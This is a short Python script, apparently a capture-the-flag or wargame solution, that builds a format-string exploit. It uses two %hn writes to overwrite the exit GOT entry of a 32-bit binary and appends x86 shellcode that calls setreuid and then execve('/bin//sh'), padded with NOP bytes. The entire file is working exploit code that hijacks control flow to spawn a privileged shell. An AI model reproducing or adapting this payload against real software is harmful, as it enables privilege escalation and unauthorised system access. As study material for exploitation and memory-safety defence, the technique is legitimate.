import struct

buffer_size = 1024
target_addr = 0x804b28c #exit@got
target_addr_2 = 0x804b28c+2 #exit@got

jmp_addr_high = 0xcd10
jmp_addr_low = 0xffff

shellcode = "\x6a\x31\x58\x99\xcd\x80\x89\xc3\x89\xc1\x6a\x46"
shellcode += "\x58\xcd\x80\xb0\x0b\x52\x68\x6e\x2f\x73\x68\x68"
shellcode += "\x2f\x2f\x62\x69\x89\xe3\x89\xd1\xcd\x80"

def padding(p, shellcode):
	off = buffer_size - len(p)
	ret = p
	ret += shellcode
	ret += "\x90"*(off - len(shellcode))
	return ret
def format_write_dword(index, addresses_len, dword_low_part, dword_high_part):
	payload = "%"+str(index)+"$"
	written_high_part = dword_high_part-addresses_len
	payload += str(written_high_part)
	payload += "x"
	payload += "%"+str(index)+"$hn"
	payload += "%"+str(index+1)+"$"
	payload += str(dword_low_part-addresses_len-written_high_part)
	payload += "x"
	payload += "%"+str(index+1)+"$hn"
	return payload

payload = struct.pack("I", target_addr)
payload += struct.pack("I", target_addr_2)
len_test = len(format_write_dword(4, len(payload), jmp_addr_low, jmp_addr_high))+len(payload)
payload += format_write_dword(4, len(payload), jmp_addr_low, jmp_addr_high+len_test)
payload = padding(payload, shellcode)
print(payload)